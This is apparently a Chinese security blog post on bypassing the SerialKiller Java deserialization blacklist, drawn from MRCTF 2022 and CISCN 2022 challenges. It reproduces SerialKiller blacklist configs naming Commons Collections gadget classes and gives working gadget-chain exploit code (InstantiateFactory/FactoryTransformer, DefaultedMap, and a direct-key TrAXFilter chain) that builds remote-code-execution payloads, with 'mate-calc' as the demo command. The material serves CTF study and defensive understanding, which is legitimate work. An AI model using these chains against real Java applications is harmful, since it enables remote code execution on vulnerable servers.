---
title: Java 反序列化绕过 SerialKiller
date: 2023-06-14 20:32:11
categories:
- Java
tags:
- Deserialization
toc: true
mermaid: true
image:
  path: /assets/images/java.png
---

> - [Java-反序列化绕过-SerialKiller](/posts/Java-反序列化绕过-SerialKiller/)
- [Java-反序列化绕过非原生反序列化器](/posts/Java-反序列化绕过非原生反序列化器/)
- [Java-反序列化绕过-RASP](/posts/Java-反序列化绕过-RASP/)

## SerialKiller
SerialKiller 是一个用于防御 java 反序列化攻击的库，允许使用配置文件来指定黑白名单。使用 SerialKiller 时只需要用 SerialKiller 替代标准库 java.io.ObjectInputStream
```java
ObjectInputStream ois = new ObjectInputStream(is);
String msg = (String) ois.readObject();
```
替换为：
```java
ObjectInputStream ois = new SerialKiller(is, "/etc/serialkiller.conf");
String msg = (String) ois.readObject();
```
SerialKiller 示例配置文件如下：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- serialkiller.conf -->
<config>
    <refresh>6000</refresh>
    <mode>
        <!-- set to 'false' for blocking mode -->
        <profiling>false</profiling>
    </mode>
    <logging>
        <enabled>false</enabled>
    </logging>
    <blacklist>
        <!-- ysoserial's CommonsCollections1,3,5,6 payload  -->
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InvokerTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ConstantTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateTransformer$</regexp>
        <!-- ysoserial's CommonsCollections2,4 payload  -->
        <regexp>org\.apache\.commons\.collections4\.functors\.InvokerTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.functors\.ChainedTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.functors\.ConstantTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.functors\.InstantiateTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.comparators\.TransformingComparator$</regexp>
    </blacklist>
    <whitelist>
        <regexp>.*</regexp>
    </whitelist>InvokerTransformer、ChainedTransformer
</config>
```
这个配置文件指定了一个黑名单，过滤了 CC 链中的 gadget 如 InvokerTransformer、ChainedTransformer 等。

## CC 链绕过

![20230803042045](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230803042045.png)

通常比赛中不会将 CC 链的 sink 点过滤掉，拿上面的 SerialKiller 来说，黑名单将 
- InvokerTransformer
- ChainedTransformer
- ConstantTransformer
- InstantiateTransformer
这几个类过滤掉后，原有的 CC 链就无法使用了，需要开发新的利用链。

### 代替 InstantiateTransformer
#### InstantiateFactory
MRCTF_2022 ezjava 这道题的 waf 如下：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- serialkiller.conf -->
<config>
    <refresh>6000</refresh>
    <mode>
        <!-- set to 'false' for blocking mode -->
        <profiling>false</profiling>
    </mode>
    <logging>
        <enabled>false</enabled>
    </logging>
    <blacklist>
        <!-- ysoserial's CommonsCollections1,3,5,6 payload  -->
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InvokerTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ConstantTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateTransformer$</regexp>
        <!-- ysoserial's CommonsCollections2,4 payload  -->
        <regexp>org\.apache\.commons\.collections4\.functors\.InvokerTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.functors\.ChainedTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.functors\.ConstantTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.functors\.InstantiateTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.comparators\.TransformingComparator$</regexp>
    </blacklist>
    <whitelist>
        <regexp>.*</regexp>
    </whitelist>InvokerTransformer、ChainedTransformer
</config>
```
可以看到 InstantiateTransformer、InvokerTransformer、ChainedTransformer、ConstantTransformer 都被过滤了。因此原有的几条链都无法使用。

这道题用到的是 InstantiateFactory。

InstantiateFactory 的 create 方法中会调用 newInstance 函数， 只要触发 create 方法，就可以实例化 TrAXFilter 来 RCE。
```java
    public Object create() {
        if (this.iConstructor == null) {
            this.findConstructor();
        }

        try {
            return this.iConstructor.newInstance(this.iArgs);
```

而 FactoryTransformer 中的 transform 方法又可以调用 create。
```java
    public Object transform(Object input) {
        return this.iFactory.create();
    }
```
这样就可以得到一条新的利用链：
```java
public static Transformer instantiateFactory2RCE(String cmd) throws Exception {
    Transformer transformer = new FactoryTransformer(new InstantiateFactory(
            TrAXFilter.class,
            new Class[] { Templates.class },
            new Object[] {GTemplates.getEvilTemplates(cmd)} ));
    return transformer;
}
```

EXP：
```java
HashMap hashMap = GCC.getValue2TransformerInvoke(GCC.instantiateFactory2RCE("mate-calc"));

Object expObj = GBadAttributeValueExpException.deserialize2ToString(hashMap);

byte[] exp = SerializeUtils.serialize(expObj);

System.out.println("--------");

SerializeUtils.serializeKillerDeserialize(exp,"filter/mrctf2022.ezjava.xml");
```

### 代替 LazyMap

CISCN_2022 loveme 这道题的 waf 如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- serialkiller.conf -->
<config>
    <refresh>6000</refresh>
    <mode>
        <!-- set to 'false' for blocking mode -->
        <profiling>false</profiling>
    </mode>
    <logging>
        <enabled>false</enabled>
    </logging>
    <blacklist>
        <!-- ysoserial's CommonsCollections1,3,5,6 payload  -->
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InvokerTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ConstantTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
        <!-- ysoserial's CommonsCollections2,4 payload  -->
        <regexp>org\.apache\.commons\.collections4\.functors\.InvokerTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.functors\.ConstantTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections4\.comparators\.TransformingComparator$</regexp>
        <regexp>org\.apache\.commons\.collections4\.functors\.InstantiateFactory$</regexp>
        <regexp>org\.apache\.commons\.beanutils\.BeanComparator$</regexp>
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InvokerTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.map\.LazyMap</regexp>
        <regexp>com\.sun\.rowset\.JdbcRowSetImpl$</regexp>
        <regexp>java\.rmi\.registry\.Registry$</regexp>
        <regexp>java\.rmi\.server\.ObjID$</regexp>
        <regexp>java\.rmi\.server\.RemoteObjectInvocationHandler$</regexp>
        <regexp>org\.springframework\.beans\.factory\.ObjectFactory$</regexp>
        <regexp>org\.springframework\.core\.SerializableTypeWrapper\$MethodInvokeTypeProvider$</regexp>
        <regexp>org\.springframework\.aop\.framework\.AdvisedSupport$</regexp>
        <regexp>org\.springframework\.aop\.target\.SingletonTargetSource$</regexp>
        <regexp>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$</regexp>
        <regexp>org\.springframework\.core\.SerializableTypeWrapper\$TypeProvider$</regexp>
        <regexp>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$</regexp>
        <regexp>java\.util\.PriorityQueue$</regexp>
        <regexp>java\.lang\.reflect\.Proxy$</regexp>
        <regexp>javax\.management\.MBeanServerInvocationHandler$</regexp>
        <regexp>javax\.management\.openmbean\.CompositeDataInvocationHandler$</regexp>
        <regexp>java\.beans\.EventHandler$</regexp>
        <regexp>java\.util\.Comparator$</regexp>
        <regexp>org\.reflections\.Reflections$</regexp>
    </blacklist>
    <whitelist>
        <regexp>.*</regexp>
    </whitelist>
</config>
```

可以看到 waf 过滤了 LazyMap，LazyMap 的 get 方法可以调用到 transform 方法，因此只需要找到能够代替 LazyMap 调用 transform 方法的类即可。借助 IDEA 可以找到调用了 transform 方法的地方。 
```java
InvokerTransformer.transform
    TransformingComparator.compare
    CollectionUtils.collect
    TransformIterator.transform
    ObjectGraphIterator.findNextByIterator
    DefaultedMap.get
    TransformedMap.transformKey
    TransformedPredicate.evaluate
    TransformedMap.transformValue
    CollectionUtils.transform
    TransformerPredicate.evaluate
    BeanMap.convertType
    TransformerClosure.execute
    LazyMap.get
    ObjectGraphIterator.updateCurrentIterator
    SwitchTransformer.transform
    TransformedMap.checkSetValue
    ChainedTransformer.transform
    TransformedCollection.transform
```
这里面可用的类都可能成为代替 LazyMap 的 gadget。

#### DefaultedMap
DefaultedMap 的 get 方法会对 value 属性调用 transform 方法。
```java
    public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            if (value instanceof Transformer) {
                return ((Transformer) value).transform(key);
            }
            return value;
        }
        return map.get(key);
    }
```
构造时 DefaultedMap 与 LazyMap 基本一致，区别在于 LazyMap 使用的是 factory 属性，DefaultedMap 使用的是 value 属性。
```java
    public static HashMap getValue2TransformerInvoke_DefaultedMap(Transformer transformer) throws Exception {
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> defaultedMap = DefaultedMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap, "whatever");

        HashMap<Object, Object> source = new HashMap<>();
        source.put(tiedMapEntry, "dummykitty");
        defaultedMap.remove("whatever");

        ReflectUtils.setFieldValue(defaultedMap,"value", transformer);

        return source;
    }
```

#### TransformedMap
TransformedMap 的 setValue 方法也可以调用 transform 方法，在 CC1 中，通常使用 AnnotationInvocationHandler 充当反序列化的入口类，因为 AnnotationInvocationHandler 的 readObject 方法可以调用 setValue 方法。但 AnnotationInvocationHandler 在 jdk 1.8 之后无法使用了。这里不做详细说明。

### 代替 ConstantTransformer
在 GTemplate 的利用中，基本上 payload 中都会使用到 ConstantTransformer 和 ChainedTransformer，如下：
```java
    public static Transformer instantiateTransformer2RCE(String cmd) throws Exception {
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] {GTemplates.getEvilTemplates(cmd)} )};
        Transformer transformerChain = new ChainedTransformer(transformers);
        return transformerChain;
    }
```
但实际上 LazyMap、DefaultedMap 在调用 get 方法时会传入 key 参数：
```java
    public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```
在使用 ChainedTransformer 和 ConstantTransformer 时，由于 ConstantTransformer 固定了返回值，LazyMap 的 key 只要传入任意值就可以了。

#### 直接传入 key

实际上 LazyMap.get 可以直接调用 InstantiateTransformer.transform, key 只要传入 TrAXFilter.class 就可以达到相同的目的。

```java
    String cmd = "mate-calc";
    HashMap innermap = new HashMap();

    Transformer transformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{GTemplates.getEvilTemplates(cmd)});

    DefaultedMap map = (DefaultedMap) DefaultedMap.decorate(innermap,transformer);

    TiedMapEntry tiedmap = new TiedMapEntry(map, TrAXFilter.class);

    HashSet exp = new HashSet(1);
    exp.add("foo");


    Object[] array = (Object[]) ReflectUtils.getFieldValue(ReflectUtils.getFieldValue(exp,"map"),"table");

    Object node = array[0];
    if(node == null){
        node = array[1];
    }

    ReflectUtils.setFieldValue(node,"key",tiedmap);

    byte[] payload = SerializeUtils.serialize(exp);
```

这在题目过滤了 ChainedTransformer 和 ConstantTransformer 的情况下算是一个绕过手段。 

## 参考资料
- [ikkisoft/SerialKiller: Look-Ahead Java Deserialization Library](https://github.com/ikkisoft/SerialKiller)